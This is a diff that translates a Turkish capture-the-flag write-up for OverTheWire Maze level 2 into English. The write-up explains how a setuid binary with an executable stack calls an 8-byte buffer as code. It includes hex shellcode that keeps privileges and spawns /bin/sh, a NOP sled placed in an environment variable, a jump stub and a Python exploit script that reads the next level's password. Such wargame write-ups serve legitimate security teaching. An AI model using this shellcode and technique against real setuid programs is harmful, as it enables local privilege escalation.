@@ -1,62 +1,69 @@
 # OverTheWire — Maze Level 2 → 3
 
-> Hedef: `maze2`'den `maze3` şifresi. Sonuç: **`**********`** (gizlendi)
-> Teknik: **Çalıştırılabilir stack (NX kapalı)** + stack buffer'ın fonksiyon işaretçisi olarak çağrılması → env'deki shellcode'a sıçrayan 8-baytlık stub.
+> Goal: Get `maze3` password from `maze2`. Result: **`**********`** (hidden)
+> Technique: **Executable stack (NX disabled)** + stack buffer called as a function pointer →
+> 8-byte stub that jumps to shellcode in the environment.
 
 ---
 
-## 1. İlk Bakış
+## 1. First Look
 ```bash
 checksec --file=/maze/maze2
 # No canary? -> Canary FOUND | NX DISABLED | No PIE
-/maze/maze2            # argümansız → exit(1)
-cat /proc/sys/kernel/randomize_va_space   # 0  (ASLR KAPALI)
+/maze/maze2            # no arguments → exit(1)
+cat /proc/sys/kernel/randomize_va_space   # 0  (ASLR OFF)
 ```
-**NX kapalı** = stack'teki baytlar kod olarak çalışabilir. ASLR kapalı = adresler deterministik.
+**NX disabled** = bytes on the stack can execute as code. ASLR off = addresses are deterministic.
 
-## 2. Analiz
-Sözde-kod:
+## 2. Analysis
+Pseudocode:
 ```c
 char buf[8];
-void (*fp)() = buf;          // fp, buf'ı işaret eder
+void (*fp)() = buf;          // fp points to buf
 if (argc != 2) exit(1);
-strncpy(buf, argv[1], 8);    // tam 8 bayt (overflow YOK, canary'ye dokunmaz)
-fp();                        // buf'ı KOD olarak çağır
+strncpy(buf, argv[1], 8);    // exactly 8 bytes (NO overflow, doesn't touch canary)
+fp();                        // call buf AS CODE
 ```
-Overflow yok ama gerek de yok: program **stack buffer'ı doğrudan çağırıyor**. NX kapalı olduğundan buf'a yazdığımız makine kodu çalışır.
+No overflow — but none is needed: the program **directly calls the stack buffer**. Since NX is
+disabled, machine code written to buf executes.
 
-## 3. Zafiyet & Plan
-Sorun: buf'a sadece **8 bayt** sığıyor — tam `execve("/bin/sh")` shellcode'u (~45 bayt) sığmaz.
-Çözüm — **iki aşamalı**:
-1. Büyük shellcode'u bir **ortam değişkenine** (env `SC`) koy; NOP sled ile öne yastıkla.
-2. buf'a sığan 8 baytlık **stub**: `mov eax, <sled_adresi>; jmp eax` (`b8 <addr> ff e0` + `90`) → sled'e sıçra → shellcode.
+## 3. Vulnerability & Plan
+Problem: only **8 bytes** fit in buf — a full `execve("/bin/sh")` shellcode (~45 bytes) won't fit.
+Solution — **two-stage**:
+1. Put the large shellcode in an **environment variable** (env `SC`), padded with a NOP sled.
+2. The 8-byte **stub** that fits in buf: `mov eax, <sled_address>; jmp eax`
+   (`b8 <addr> ff e0` + `90`) → jump to sled → shellcode.
 
-ASLR kapalı olduğu için env adresi sabit. Adresi, **argv/env/execfn uzunlukları birebir eşleştirilmiş** 32-bit bir yardımcıyla okuyup, geniş NOP sled'in ortasını hedefliyoruz (küçük kaymaları sled yutar).
+With ASLR off, the env address is fixed. We read it with a **32-bit helper** whose argv/env/execfn
+lengths match exactly, and target the middle of the large NOP sled (small offsets are absorbed).
 
-> İki tuzak:
-> - **`MAX_ARG_STRLEN` = 128KB**: tek bir env string'i 131072 baytı aşamaz → sled'i 64KB tut.
-> - **Null bayt yok**: `argv[1]` (stub) ve `SC` (env) C string olduğundan içlerinde `0x00` olamaz. Stack adresleri `0xffff….` olduğundan stub null-suz; shellcode da null-suz seçildi.
+> Two gotchas:
+> - **`MAX_ARG_STRLEN` = 128KB**: a single env string cannot exceed 131072 bytes → keep sled at 64KB.
+> - **No null bytes**: `argv[1]` (stub) and `SC` (env) are C strings so `0x00` is forbidden inside
+>   them. Stack addresses are `0xffff…` so the stub is naturally null-free; shellcode was chosen
+>   null-free too.
 
-## 4. Exploit (özet)
+## 4. Exploit (summary)
 ```python
-# 45 baytlık shellcode: setresuid32(geteuid x3) + execve("/bin//sh")
+# 45-byte shellcode: setresuid32(geteuid x3) + execve("/bin//sh")
 sc  = bytes.fromhex('31c0b031cd80 89c389c189c2 31c0b0d0cd80 31c050'
                     '682f2f7368 682f62696e 89e3 50 89e2 53 89e1 b00b cd80'.replace(' ',''))
-SC  = b'\x90'*0x10000 + sc          # 64KB NOP sled + shellcode  (env değişkeni)
-# 1) Adresi öğren: argv0="/maze/maze2", argv1=8 bayt, execfn 11 karakter eşleşsin
-# 2) stub = b8 <base+0x8000 little-endian> ff e0 90   (8 bayt, sled ortası)
+SC  = b'\x90'*0x10000 + sc          # 64KB NOP sled + shellcode  (env variable)
+# 1) Find the address: argv0="/maze/maze2", argv1=8 bytes, execfn 11 chars must match
+# 2) stub = b8 <base+0x8000 little-endian> ff e0 90   (8 bytes, sled midpoint)
 os.execve('/maze/maze2', [b'/maze/maze2', stub], {b'SC': SC})
 ```
-`stdin`'e `/bin/cat /etc/maze_pass/maze3` besleyince, spawn olan kabuk (maze3) şifreyi basar.
+Feeding `/bin/cat /etc/maze_pass/maze3` to stdin, the spawned shell (maze3) prints the password.
 
-Shellcode önce `setresuid32(euid,euid,euid)` yapar → `/bin/sh`'in yetki düşürmesini engeller, sonra `execve("/bin//sh")`.
+Shellcode first calls `setresuid32(euid,euid,euid)` → prevents `/bin/sh` from dropping privileges,
+then `execve("/bin//sh")`.
 
-## Dersler
-| Konu | Not |
-|------|-----|
-| NX / DEP | Kapalıysa stack/heap'teki veri **kod** olarak koşar → klasik ret2stack/shellcode |
-| Fonksiyon işaretçisi | Programın kendisi buffer'ı çağırması, overflow gerektirmeden kod çalıştırır |
-| Küçük buffer | 8 bayt yetmez → stub ile env'deki büyük shellcode'a yönlen |
-| Env shellcode + NOP sled | ASLR kapalıyken env adresi sabit; geniş sled adres hatasını affeder |
-| `MAX_ARG_STRLEN` | tek argv/env string ≤ 128KB (`32*PAGE_SIZE`) |
-| Deterministik adres | aynı argv0/argv1/execfn uzunluğu + aynı env = aynı adres (32-bit yardımcıyla oku) |
+## Lessons
+| Topic | Note |
+|-------|------|
+| NX / DEP | If disabled, data on the stack/heap **runs as code** → classic ret2stack/shellcode |
+| Function pointer | The program itself calling the buffer executes code without any overflow |
+| Small buffer | 8 bytes isn't enough → use a stub to redirect to the large shellcode in env |
+| Env shellcode + NOP sled | With ASLR off, env address is fixed; large sled absorbs small offsets |
+| `MAX_ARG_STRLEN` | Single argv/env string ≤ 128KB (`32*PAGE_SIZE`) |
+| Deterministic address | Same argv0/argv1/execfn length + same env = same address (read with a 32-bit helper) |
